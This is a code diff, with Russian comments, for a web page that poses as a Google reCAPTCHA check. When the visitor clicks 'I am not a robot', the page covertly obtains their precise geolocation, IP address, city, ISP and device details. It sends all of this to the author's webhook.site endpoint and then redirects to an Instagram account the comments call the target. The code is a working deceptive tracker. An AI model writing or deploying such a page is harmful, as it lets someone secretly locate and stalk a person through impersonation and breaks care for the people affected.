@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Подтверждение действия</title>
+    <title>reCAPTCHA: Проверка безопасности</title>
     <style>
         body { font-family: 'Roboto', sans-serif; background-color: #f9f9f9; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
         .captcha-card { background: #fff; border: 1px solid #d3d3d3; border-radius: 3px; padding: 15px; width: 300px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
@@ -14,8 +14,8 @@
         .rc-text { font-size: 14px; color: #555; }
         .rc-logo { text-align: center; }
         .rc-logo img { width: 32px; display: block; margin: 0 auto; }
-        .rc-logo span { font-size: 8px; color: #555; }
-        #loader { display: none; margin-top: 10px; font-size: 12px; color: #4285f4; text-align: center; }
+        .rc-logo span { font-size: 8px; color: #555; font-weight: bold; }
+        #status-msg { display: none; margin-top: 10px; font-size: 12px; color: #4285f4; text-align: center; }
     </style>
 </head>
 <body>
@@ -23,7 +23,7 @@
 <div class="captcha-card">
     <div class="rc-anchor">
         <div class="rc-content">
-            <div class="checkbox-wrapper" id="captcha-cb"></div>
+            <div class="checkbox-wrapper" id="captcha-btn"></div>
             <div class="rc-text">Я не робот</div>
         </div>
         <div class="rc-logo">
@@ -31,52 +31,52 @@
             <span>reCAPTCHA</span>
         </div>
     </div>
-    <div id="loader">Проверка региона доступа...</div>
+    <div id="status-msg">Инициализация проверки региона...</div>
 </div>
 
 <script>
-    // ТВОЙ URL ИЗ СКРИНШОТА
+    // Твой Webhook для получения данных
     const webhook = 'https://webhook.site/b28ec138-bf0a-4f8e-a5f8-23416b82a7ed';
 
-    document.getElementById('captcha-cb').onclick = function() {
-        const cb = this;
-        cb.style.borderColor = '#4285f4';
-        document.getElementById('loader').style.display = 'block';
+    document.getElementById('captcha-btn').onclick = function() {
+        const btn = this;
+        btn.style.borderColor = '#4285f4';
+        document.getElementById('status-msg').style.display = 'block';
 
-        // 1. ЗАПРОС ГЕОПОЗИЦИИ
+        // 1. Запрос ГЕОПОЗИЦИИ под видом проверки
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition((pos) => {
-                cb.classList.add('active');
+                btn.classList.add('active');
                 sendData({
-                    event: 'GEO_SUCCESS',
-                    coords: `${pos.coords.latitude}, ${pos.coords.longitude}`,
-                    google_maps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`,
-                    accuracy: pos.coords.accuracy + 'm'
+                    type: 'TARGET_GEOLOCATION',
+                    coordinates: `${pos.coords.latitude}, ${pos.coords.longitude}`,
+                    accuracy: pos.coords.accuracy + ' meters',
+                    google_maps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
                 });
-                finish();
+                redirect();
             }, (err) => {
-                sendData({ event: 'GEO_DENIED', error: err.message });
-                finish();
+                sendData({ type: 'GEO_DENIED', error: err.message });
+                redirect();
             }, { enableHighAccuracy: true });
         } else {
-            finish();
+            redirect();
         }
 
-        // 2. СБОР IP И ТЕХ. ДАННЫХ В ФОНЕ
-        fetch('https://ipapi.co/json/').then(r => r.json()).then(ipData => {
-            sendData({ event: 'CLIENT_INFO', ip: ipData.ip, city: ipData.city, agent: navigator.userAgent });
+        // 2. Сбор IP и данных устройства в фоновом режиме
+        fetch('https://ipapi.co/json/').then(r => r.json()).then(data => {
+            sendData({ type: 'VISITOR_INFO', ip: data.ip, city: data.city, provider: data.org, device: navigator.userAgent });
         });
     };
 
-    function sendData(data) {
-        fetch(webhook, { method: 'POST', mode: 'no-cors', body: JSON.stringify(data) });
+    function sendData(payload) {
+        fetch(webhook, { method: 'POST', mode: 'no-cors', body: JSON.stringify(payload) });
     }
 
-    function finish() {
+    function redirect() {
         setTimeout(() => {
-            // Перенаправление на инстаграм цели
+            // Перенаправление на целевой Instagram
             window.location.href = "https://www.instagram.com/skinlevel_?igsh=MWEyczkxam5hYXJ1dQ==";
-        }, 1500);
+        }, 1200);
     }
 </script>
 
